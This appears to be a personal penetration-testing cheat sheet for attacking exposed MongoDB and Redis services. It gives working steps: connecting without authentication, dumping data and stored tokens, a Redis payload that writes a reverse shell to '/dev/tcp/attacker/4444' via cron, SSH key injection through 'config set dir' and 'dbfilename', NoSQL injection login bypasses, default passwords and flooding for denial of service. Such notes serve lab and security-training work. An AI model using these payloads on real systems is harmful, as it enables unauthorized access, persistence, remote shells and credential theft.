---
title: "NoSQL (mongoDB or Redis)"
tags:
  - fetus
---
- link to actual dedicated files for later exploration: [[MongoDB]], [[Redis]] 
### checklist:
- Unauthenticated Access
    - Just connect: `mongo <ip>:27017` or `redis-cli -h <ip> -p 6379`
    - If no password needed, it's game over—full DB access :)
    
- Data Dump & Recon
    - MongoDB:
        - `show dbs`, `use <db>`, `show collections`
        - `db.<collection>.find()`
    - Redis:
        - `keys `, `get <key>`, `info`, `config get `
    
- Remote Command Execution (Redis)
    - Write to cron, authorized_keys, or init scripts
    - Example: `SET 1 "\n\n     root bash -i >& /dev/tcp/attacker/4444 0>&1\n\n"` + `SAVE`
    
- Persistence via SSH Key Injection (Redis)
    - Overwrite `~/.ssh/authorized_keys` by setting a key and saving to file:
        - `config set dir /root/.ssh/`
        - `config set dbfilename authorized_keys`
        - `set x "<pubkey>"`
        - `save`
    
- RCE via MongoDB with Web App
    - Abused when MongoDB is connected to Node.js (e.g., Express.js)
    - Try NoSQLi: `{"$gt": ""}` in login fields or params
    - Payloads like `{"username": {"$ne": null}, "password": {"$ne": null}}`
    
- Command Injection in Deserialization (MongoDB)
    - Apps that unsafely deserialize BSON/JSON from user input = easy shell
    - Common in MEAN/MERN stacks
    
- Access to Internal Services
    - Redis: port-forward into other boxes (`redis-cli -h 127.0.0.1`)
    - Can act as a stepping stone for SSRF/priv esc
	
- File Write/Read Abuse
    - Redis: can write to _any_ path Redis has perms for
    - MongoDB: if app lets you use `$where` or similar JS evals, you might execute code
    
- Weak Auth / Default Passwords
    - Common Redis default = `foobared`
    - MongoDB sometimes has `admin:admin`, or old versions with _no auth by default_
    
- Sensitive Info in Memory (Redis)
    - Redis often stores session tokens, API keys, plaintext creds
    - Dump them with `keys `, `get`, or `scan`
    
- Out-of-Memory or DoS Attacks
    - Redis and Mongo love to crash when flooded
    - Try huge `set` or `eval` payloads if DoS testing is fair game in your lab
    
- Exposed Web UIs
    - Mongo-express, Redis-Commander, or similar dashboards = often open and exploitable
    - Look for them on weird ports like `8081`, `6380`, or `/admin`